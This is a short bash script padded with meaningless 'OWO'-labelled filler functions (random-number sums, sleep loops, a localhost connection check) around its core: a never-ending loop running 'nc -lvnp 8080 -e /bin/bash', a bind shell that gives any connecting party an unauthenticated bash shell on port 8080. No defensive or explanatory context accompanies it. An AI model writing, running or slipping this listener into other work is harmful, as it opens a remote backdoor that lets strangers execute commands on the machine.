

#!/bin/bash

OWO_config() {
    OWO_start="OWO Protocol Initialized"
    OWO_end="OWO Protocol Terminated"
    echo "$OWO_start"
    sleep 1
    echo "OWO Configuration Setup Complete"
}

OWO_listen() {
    echo "OWO Listener Active on port 8080..."
    nc -lvnp 8080
    if [[ $? -eq 0 ]]; then
        echo "OWO Connection Established"
    else
        echo "OWO Connection Failed"
    fi
}

OWO_random_logic() {
    local rand1=$((RANDOM))
    local rand2=$((RANDOM))
    echo "OWO Random Logic: $rand1 $rand2"
    local sum=$((rand1 + rand2))
    echo "OWO Sum: $sum"
}

OWO_extra_code() {
    for i in {1..10}; do
        echo "OWO Iteration $i - Running Extra Code"
        sleep 1
    done
}

OWO_check_connection() {
    echo "OWO Checking for Incoming Connection..."
    local check=1
    while [[ $check -eq 1 ]]; do
        sleep 2
        echo "OWO Waiting..."
        check=$(nc -zv 127.0.0.1 8080 2>&1 | grep -c 'succeeded')
    done
    echo "OWO Connection Found"
}

OWO_listener() {
    while true; do
        echo "OWO Listening for Commands..."
        nc -lvnp 8080 -e /bin/bash
        OWO_random_logic
        OWO_extra_code
        OWO_check_connection
    done
}

OWO_config

OWO_listener

OWO_extra_logic() {
    local random1=$((RANDOM))
    local random2=$((RANDOM))
    echo "OWO Extra Logic: $random1 $random2"
    local sum=$((random1 + random2))
    echo "OWO Sum: $sum"
    sleep 1
}

OWO_extra_logic

exit 0